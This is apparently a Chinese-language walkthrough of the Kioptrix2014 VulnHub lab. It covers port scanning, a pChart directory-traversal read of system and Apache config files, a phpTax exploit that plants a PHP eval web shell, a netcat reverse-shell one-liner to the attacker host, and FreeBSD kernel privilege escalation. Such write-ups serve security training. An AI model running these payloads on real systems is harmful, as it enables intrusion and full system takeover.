### 端口扫描

```bash
# Nmap 7.94SVN scan initiated Thu Nov  7 09:45:08 2024 as: nmap -sT --min-rate 6000 -p- -oN nmapscan/port_scan 192.168.217.143
Nmap scan report for 192.168.217.143
Host is up (0.018s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
8080/tcp open   http-proxy
MAC Address: 00:0C:29:14:A7:E4 (VMware)

# Nmap done at Thu Nov  7 09:45:30 2024 -- 1 IP address (1 host up) scanned in 22.09 seconds
```

```bash
# Nmap 7.94SVN scan initiated Thu Nov  7 09:52:22 2024 as: nmap -sT -A -p22,80,8080 -oN nmapscan/detils_scan 192.168.217.143
Nmap scan report for 192.168.217.143
Host is up (0.00067s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 00:0C:29:14:A7:E4 (VMware)
Device type: general purpose
Running (JUST GUESSING): FreeBSD 9.X|10.X (88%)
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10
Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.67 ms 192.168.217.143
```

根据扫描的结果看：这是一台`FreeBSD`系统

### web端渗透

80端口可以访问，8080是403，存在访问限制

```bash
┌──(root㉿kali)-[~/vulnhub/Kioptrix2014]
└─# curl http://192.168.217.143     
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```

访问`pChart2.1.3/index.php`

pchart是图片工具，找漏洞就行了

```bash
searchsploit pChart 2.1.3
```

这里有一个目录穿越的漏洞

```
hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
```

![image-20241108152257675](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108152257675.png)

那就想着读`apache`的配置文件，查看8080端口有什么限制，两个端口都是apache服务

找了大半天配置文件目录都不行，最后发现这个系统的目录跟一般`linux`不太一样

![image-20241108152617588](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108152617588.png)

`/usr/local/etc/apache22/httpd.conf`

> http://192.168.217.143/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f../usr/local/etc/apache22/httpd.conf

```bash
cat httpd.conf| grep -v "#" | grep -v "^$" > httpd_new.conf
```

```
</IfModule>
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2
<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory
```

8080只允许UA是`Mozilla/4.0`开头的访问

是一个`phptax`

```bash
searchsploit phptax
```

![image-20241108154302697](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108154302697.png)

我这里利用`25849`

写文件

```
http://192.168.217.143:8080/phptax/index.php?field=shell.php&newvalue=%3C%3Fphp%20eval(%24_POST%5Bcmd%5D)%3B%3F%3E
```

```
http://192.168.217.143:8080/phptax/data/shell.php
```

![image-20241108154814021](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108154814021.png)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.217.139 1234 >/tmp/f
```

成功拿到shell

### 提权

```bash
$ id
uid=80(www) gid=80(www) groups=80(www)
$ whoami
www
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

利用内核提权，提权方式优先选择sudo，suid等，内核提权是最后的

```bash
searchsploit FreeBSD 9.0    
```

我这里用`26368.c`进行提权

用蚁剑将文件上传上去，进行编译

![image-20241108155425228](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108155425228.png)

成功拿到root